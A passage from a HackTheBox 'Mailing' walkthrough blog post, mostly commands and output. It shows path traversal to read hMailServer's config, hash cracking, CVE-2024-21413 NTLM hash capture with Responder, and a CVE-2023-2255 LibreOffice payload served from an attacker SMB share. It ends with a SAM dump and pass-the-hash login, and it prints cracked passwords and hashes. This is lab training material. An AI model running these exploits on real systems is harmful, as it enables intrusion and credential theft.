</span></span><span class="line"><span class="cl">|_  start_date: N/A
</span></span><span class="line"><span class="cl">| smb2-security-mode: 
</span></span><span class="line"><span class="cl">|   3:1:1: 
</span></span><span class="line"><span class="cl">|_    Message signing enabled but not required
</span></span><span class="line"><span class="cl">|_clock-skew: -4m48s
</span></span></code></pre></td></tr></table>
</div>
</div><p>After several attempts of searching for LFI (Local File Inclusion) vulnerabilities, I decided to click on an obvious download button. Surprisingly, this approach actually worked, leading me to further exploit the system.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-a19dd" hidden>
    <label for="zoomCheck-a19dd">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled.png" alt="Untitled" 
             />
    </label></p>
<p>I stumbled upon an intriguing configuration file path while analyzing the payload: <strong><code>..\..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.INI</code></strong>. This discovery was inspired by an old exploit I found at <a href="https://www.exploit-db.com/exploits/7012">https://www.exploit-db.com/exploits/7012</a>. Essentially, this exploit provided me with the file structure for locating the hMailServer, specifically the <strong><code>hMailServer.INI</code></strong> file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Directories]
</span></span><span class="line"><span class="cl">ProgramFolder=C:\Program Files (x86)\hMailServer
</span></span><span class="line"><span class="cl">DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
</span></span><span class="line"><span class="cl">DataFolder=C:\Program Files (x86)\hMailServer\Data
</span></span><span class="line"><span class="cl">LogFolder=C:\Program Files (x86)\hMailServer\Logs
</span></span><span class="line"><span class="cl">TempFolder=C:\Program Files (x86)\hMailServer\Temp
</span></span><span class="line"><span class="cl">EventFolder=C:\Program Files (x86)\hMailServer\Events
</span></span><span class="line"><span class="cl">[GUILanguages]
</span></span><span class="line"><span class="cl">ValidLanguages=english,swedish
</span></span><span class="line"><span class="cl">[Security]
</span></span><span class="line"><span class="cl">AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
</span></span><span class="line"><span class="cl">[Database]
</span></span><span class="line"><span class="cl">Type=MSSQLCE
</span></span><span class="line"><span class="cl">Username=
</span></span><span class="line"><span class="cl">Password=0a9f8ad8bf896b501dde74f08efd7e4c
</span></span><span class="line"><span class="cl">PasswordEncryption=1
</span></span><span class="line"><span class="cl">Port=0
</span></span><span class="line"><span class="cl">Server=
</span></span><span class="line"><span class="cl">Database=hMailServer
</span></span><span class="line"><span class="cl">Internal=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>I attempted to crack the MD5 hashes using hashcat with the command <strong><code>hashcat.exe -m0 myhash.txt rockyou.txt</code></strong>. Fortunately, I successfully cracked one of the hashes, revealing the Administrator Password as <strong><code>homenetworkingadministrator</code></strong>.</p>
<p>However, the second hash proved to be resistant to cracking. After some research on Google, I came across a tool called hMailDatabasePasswordDecrypter, available at <a href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter">https://github.com/GitMirar/hMailDatabasePasswordDecrypter</a>. This tool specializes in decrypting blowfish-encrypted hMail database passwords.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB]
</span></span><span class="line"><span class="cl">‚îî‚îÄ# git clone https://github.com/GitMirar/hMailDatabasePasswordDecrypter.git
</span></span><span class="line"><span class="cl">Cloning into &#39;hMailDatabasePasswordDecrypter&#39;...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 8, done.
</span></span><span class="line"><span class="cl">remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8
</span></span><span class="line"><span class="cl">Receiving objects: 100% (8/8), 9.53 KiB | 1.36 MiB/s, done.
</span></span><span class="line"><span class="cl">                                                                                                                         
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB]
</span></span><span class="line"><span class="cl">‚îî‚îÄ# cd hMailDatabasePasswordDecrypter 
</span></span><span class="line"><span class="cl">                                                                                                                         
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter]
</span></span><span class="line"><span class="cl">‚îî‚îÄ# ls
</span></span><span class="line"><span class="cl">blowfish.cpp  blowfish.h  blowfish.h2  main.cpp  Makefile  README.md
</span></span><span class="line"><span class="cl">                                                                                                                         
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter]
</span></span><span class="line"><span class="cl">‚îî‚îÄ# make                             
</span></span><span class="line"><span class="cl">g++ blowfish.cpp main.cpp -o decrypt
</span></span><span class="line"><span class="cl">                                                                                                                         
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/hMailDatabasePasswordDecrypter]
</span></span><span class="line"><span class="cl">‚îî‚îÄ# ./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c
</span></span><span class="line"><span class="cl">6FC6F69152AD
</span></span></code></pre></td></tr></table>
</div>
</div><p>Following the steps outlined in the GitHub README page, I attempted to crack the password successfully. However, when I tried to connect to the POP3 server using Telnet, I encountered difficulties as it wasn&rsquo;t functioning as expected.</p>
<h2 id="user-root">User Root<a hidden class="anchor" aria-hidden="true" href="#user-root">#</a></h2>
<p>After further enumeration regarding hMailServer, I came across an exploit that could be useful, available at <a href="https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6">https://sploitus.com/exploit?id=425B7616-AF36-5AD0-912F-A6B7A45E41E6</a>. Following the steps outlined in the CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability GitHub repository at <a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability">https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability</a>, I proceeded to run Responder on my Kali machine using the command <strong><code>sudo responder -I tun0</code></strong>.</p>
<p>(Note: If Responder doesn&rsquo;t return the hashes, you can use smbserver as suggested in the proof of concept on the GitHub page. I initially encountered the same issue, but after several attempts, it worked for me.)</p>
<p>After running Responder, I executed the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(root„âøkali)-[/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
</span></span><span class="line"><span class="cl">‚îî‚îÄ# python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient mayay email pls look hi&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
</span></span><span class="line"><span class="cl">Alexander Hagenah / @xaitax / ah@primepage.de                                                                                                                                                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‚úÖ Email sent successfully.
</span></span></code></pre></td></tr></table>
</div>
</div><p>After sending the email, I monitored Responder, and to my satisfaction, I observed that it captured a user hash.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">maya::MAILING:dac4fe0aec512cc8:0ABF7016C9D7428230E543395441DBCD:010100000000000000EF6F99469EDA01293B5F358D9EF4DE0000000002000800540058005800340001001E00570049004E002D00380038003200520041004E005000380044004500500004003400570049004E002D00380038003200520041004E00500038004400450050002E0054005800580034002E004C004F00430041004C000300140054005800580034002E004C004F00430041004C000500140054005800580034002E004C004F00430041004C000700080000EF6F99469EDA01060004000200000008003000300000000000000000000000002000009BE5ABAC0CB766267616E7031B83C21B57E7A52A6903503167DE1974F23E1F3B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>I cracked the above hash with the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hashcat.exe -m 5600 myhash.txt rockyou.txt --self-test-disable
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our password is: <strong><code>m4y4ngs4ri</code></strong>. I used this password with the following command to establish a shell: <strong><code>evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri</code></strong>. This successfully granted me access to the system, and I was able to retrieve the user flag.</p>
<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
<p>I came across LibreOffice installed in the Program Files directory, and upon further investigation, I discovered a CVE associated with its version: CVE-2023-2255 (<a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a>).</p>
<p>To exploit this vulnerability, I executed the following Python code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-arduino" data-lang="arduino"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">2255.</span><span class="n">py</span> <span class="o">--</span><span class="n">cmd</span> <span class="err">&#39;</span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span> <span class="n">maya</span> <span class="o">/</span><span class="n">add</span><span class="err">&#39;</span> <span class="o">--</span><span class="n">output</span> <span class="err">&#39;</span><span class="n">exploit</span><span class="p">.</span><span class="n">odt</span><span class="err">&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This generated an exploit file named <strong><code>exploit.odt</code></strong>.</p>
<p>Next, I launched an Impacket SMB server using the command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver mailing <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span> -smb2support
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then, within the Evil-WinRM shell, I executed the following commands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">net</span> <span class="nx">use</span> <span class="err">\\</span><span class="mf">10.10.14.98</span><span class="err">\</span><span class="nx">mailing</span>
</span></span><span class="line"><span class="cl"><span class="nx">copy</span> <span class="err">\\</span><span class="mf">10.10.14.98</span><span class="err">\</span><span class="nx">mailing</span><span class="err">\</span><span class="nx">exploit</span><span class="p">.</span><span class="nx">odt</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>These commands allowed me to access the exploit file from the SMB server.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-72c69" hidden>
    <label for="zoomCheck-72c69">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%201.png" alt="Untitled" 
             />
    </label></p>
<p>After copying the <strong><code>exploit.odt</code></strong> file from the SMB server, I waited for a few moments. Then, to confirm that the user <strong><code>maya</code></strong> had elevated privileges to administrator, I executed the command <strong><code>net user maya</code></strong>.</p>
<p>With confirmation of elevated privileges, I proceeded to dump the hashes using the crackmapexec command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">crackmapexec</span> <span class="nt">smb</span> <span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">11</span><span class="p">.</span><span class="nc">14</span> <span class="nt">-u</span> <span class="nt">maya</span> <span class="nt">-p</span> <span class="s2">&#34;m4y4ngs4ri&#34;</span> <span class="nt">--sam</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This command allowed me to retrieve the SAM (Security Account Manager) database hashes from the target system.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ crackmapexec smb 10.10.11.14 -u maya -p &#34;m4y4ngs4ri&#34; --sam
</span></span><span class="line"><span class="cl">[*] First time use detected
</span></span><span class="line"><span class="cl">[*] Creating home directory structure
</span></span><span class="line"><span class="cl">[*] Creating default workspace
</span></span><span class="line"><span class="cl">[*] Initializing FTP protocol database
</span></span><span class="line"><span class="cl">[*] Initializing SSH protocol database
</span></span><span class="line"><span class="cl">[*] Initializing SMB protocol database
</span></span><span class="line"><span class="cl">[*] Initializing WINRM protocol database
</span></span><span class="line"><span class="cl">[*] Initializing LDAP protocol database
</span></span><span class="line"><span class="cl">[*] Initializing RDP protocol database
</span></span><span class="line"><span class="cl">[*] Initializing MSSQL protocol database
</span></span><span class="line"><span class="cl">[*] Copying default configuration file
</span></span><span class="line"><span class="cl">[*] Generating SSL certificate
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          [+] Dumping SAM hashes
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
</span></span><span class="line"><span class="cl">SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, to gain root access to the box without cracking the hash, I can log in using the hash we previously dumped.</p>
<p>I&rsquo;ll use the following command with impacket-wmiexec:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">impacket-wmiexec</span> <span class="nt">localadmin</span><span class="p">@</span><span class="k">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">11</span><span class="p">.</span><span class="nc">14</span> <span class="nt">-hashes</span> <span class="s2">&#34;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This command will authenticate me as the local administrator using the hashed credentials we obtained earlier, granting us root access to the box.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-2b2df" hidden>
    <label for="zoomCheck-2b2df">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%202.png" alt="Untitled" 
             />
    </label></p>
<p>There we go! We now have access to the local administrator account. We&rsquo;ve successfully rooted this easy Windows box. Great job!</p>
<h3 id="conclusion">Conclusion:<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h3>
<p>Thanks for reading my walkthrough. Hacking through the challenges presented by this box has been an enriching experience. Happy Hacking! ü´°</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
      <li><a href="http://localhost:1313/tags/easy/">Easy</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/writeups/hackthebox/intuition/">
    <span class="title">¬´ Prev</span>
    <br>
    <span>Intuition Writeup - HackTheBox</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> ¬∑ 

    <span>
        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
